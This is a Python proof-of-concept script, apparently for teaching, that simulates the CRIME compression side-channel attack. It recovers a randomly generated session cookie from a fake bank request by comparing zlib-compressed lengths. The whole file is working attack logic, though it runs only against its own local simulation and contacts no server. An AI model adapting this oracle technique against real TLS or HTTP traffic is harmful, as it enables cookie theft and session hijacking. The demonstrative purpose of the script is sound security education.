# This is supposedly what CRIME by Juliano Rizzo and Thai Duong will do
# Algorithm by Thomas Pornin, coding by xorninja, improved by @kkotowicz
# http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/

# Modified 16-Sep-2019 by Noemi Glaeser

import string
import zlib
import sys
import random
import time # to print more slowly

charset = string.ascii_letters + string.digits + "%/+="

COOKIE = ''.join(random.choice(charset) for x in range(30))
print("Randomly generated cookie: " + str(COOKIE))

time.sleep(1)

HEADERS = ("POST / HTTP/1.1\r\n"
       "Host: thebankserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
           "Accept: */*\r\n"
           "Referer: https://thebankserver.com/\r\n"
           "Cookie: secret=" + COOKIE +  "\r\n"
           "Accept-Encoding: gzip,deflate,sdch\r\n"
           "Accept-Language: en-US,en;q=0.8\r\n"
           "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
           "\r\n")

BODY = ("POST / HTTP/1.1\r\n"
           "Host: thebankserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
           "Accept: */*\r\n"
           "Referer: https://thebankserver.com/\r\n"
           "Cookie: secret="
         )

BODY_SUFFIX=("\r\n"
           "Accept-Encoding: gzip,deflate,sdch\r\n"
           "Accept-Language: en-US,en;q=0.8\r\n"
           "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
           "\r\n")

cookie = ""

def compress(data):

    c = zlib.compressobj()
    foo = c.compress(bytes(data, 'utf-8'))
    foo += c.flush(zlib.Z_SYNC_FLUSH)
    return foo

def findnext(b,bs,charset, show_guess):
    # is bs always ""?
    #print "body len",len(b)
    baselen = len(compress(HEADERS +
                      b +
                      bs))

    possible_chars = []

    #print "base length: %s" % baselen
    
    for c in charset:
        guess_cookie = cookie + c
        length = len(compress(HEADERS +
                      b +
                      c + # guess a character
                      bs))

        #print repr(c), length, baselen
        if show_guess:
            print("cookie ?= %s" % guess_cookie)
            time.sleep(.01)
        # print "guess next char %s\tpacket length %s" % (c, length)

        if length <= baselen:
            # if this guess causes the packet to be extra compressed,
            # it could be the next character of the cookie
            possible_chars.append(c)

    #print '=', possible_chars
    # print "possible next chars: %s" % possible_chars
    return possible_chars

def exit():
    print("Original cookie: %s" % COOKIE)
    print("Leaked cookie  : %s" % cookie)
    sys.exit(1)

    
def forward():
    global cookie
    while len(cookie) < len(COOKIE):
        chop = 1

        # append what is known of the cookie to the body
        possible_chars = findnext(BODY + cookie, "", charset, True)
        # all the next characters of the cookie that compress the string more

        body_tmp = BODY
        orig = possible_chars
        while not len(possible_chars) == 1:
            if len(body_tmp) < chop:
                #print "stuck at", possible_chars
                return False

            if len(orig) > 0:
                print(orig)
                time.sleep(.3)

            # shift the compression window over by one
            # until compression ratio rules out all but one character
            body_tmp = body_tmp[chop:]
            possible_chars = findnext(body_tmp + cookie, "", orig, False)

        cookie = cookie + possible_chars[0]

        def prGreen(skk): print("\033[92m {}\033[00m".format(skk))

        prGreen("\ncookie  : %s\n" % cookie)
        time.sleep(1)
    return True

while BODY.find("\r\n") >= 0:

    def prRed(skk): print("\033[91m {}\033[00m".format(skk))
    
    if not forward():
        # messed up some character and got stuck
        # undo the last character
        prRed("\nstuck, undo last character...")

        cookie = cookie[:-1]
    
    if len(cookie) >= len(COOKIE):
        exit()
        # found the cookie
    prRed("reducing body\n")
    BODY = BODY[BODY.find("\r\n") + 2:]
    time.sleep(.3)
    #print BODY

exit()
